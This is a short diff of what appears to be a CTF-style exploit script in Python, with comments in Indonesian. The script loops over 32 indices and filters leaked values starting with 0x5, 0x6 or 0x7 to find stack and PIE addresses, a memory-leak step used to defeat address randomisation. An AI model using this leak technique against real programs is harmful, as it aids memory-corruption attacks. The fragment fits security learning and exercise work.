@@ -11,10 +11,10 @@ for i in range(32): # kenapa pake 32 ?  idk ini lebih ke kebiasaan aja, lagipula
 
     leak = p.recvline().decode()
     
-    if leak.startswith("0x7") or leak.startswith("0x5"):
+    if leak.startswith(("0x5","0x6","0x7")):
         print(f"index {i} : {leak.strip()}")
-        # filter ini dibuat karena stack biasanya berlokasi di alamat memori tinggi : 0x7f--> 
-        # dan me leak PIE dari program : 0x5-->
+        # filter ini dibuat karena stack biasanya berlokasi di alamat memori tinggi : 0x7f...
+        # dan me leak PIE dari program : 0x5...-->0x6...
 
     p.close()
 
